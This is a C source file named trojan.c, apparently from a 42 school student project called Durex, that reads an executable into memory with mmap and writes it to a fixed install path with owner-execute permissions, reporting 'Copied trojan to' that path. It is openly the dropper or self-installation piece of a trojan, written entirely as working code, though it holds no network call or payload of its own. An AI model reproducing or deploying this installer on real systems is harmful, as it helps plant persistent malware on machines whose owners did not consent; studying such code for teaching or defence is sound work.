/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   trojan.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mdufaud <mdufaud@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/05/17 17:42:16 by mdufaud           #+#    #+#             */
/*   Updated: 2018/05/20 21:38:05 by mdufaud          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "durex.h"
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/mman.h>

int			copy_return(char *msg, char **to_fill, int ret)
{
	*to_fill = ft_strdup(msg);
	return (ret);
}

int		copy_trojan(t_trojan *trojan, char **msg)
{
	int					fd;
	unsigned int		size;
	int					ret;

	if (access(EXE_PATH, F_OK) >= 0)
		return (copy_return("Trojan already at "EXE_PATH"\n", msg, 0));
	if ((fd = open(EXE_PATH, O_CREAT | O_TRUNC | O_WRONLY, 0700)) < 0)
		return (copy_return("Could not open "EXE_PATH"\n", msg, 0));
	size = 0;
	while (size < trojan->size)
	{
		ret = write(fd, trojan->bin + size, trojan->size - size);
		if (ret <= 0)
			break ;
		size += ret;
	}
	if (ret < 0)
	{
		close(fd);
		return (copy_return("Could not write to "EXE_PATH"\n", msg, 0));
	}
	close(fd);
	return (copy_return("Copied trojan to "EXE_PATH"\n", msg, 1));
}

static void	save_bin(t_trojan *trojan, int fd)
{
	struct stat		st;

	if (fstat(fd, &st) == -1)
		return ;
	trojan->size = st.st_size;
	if ((trojan->bin = mmap(0, trojan->size, PROT_READ|PROT_EXEC, MAP_SHARED, fd, 0)) == MAP_FAILED)
		return ;
}

void		save_trojan(t_trojan *trojan, char *path)
{
	int		fd;

	trojan->bin = NULL;
	trojan->size = 0;
	if ((fd = open(path, O_RDONLY)) < 0)
		return ;
	save_bin(trojan, fd);
	close(fd);
}
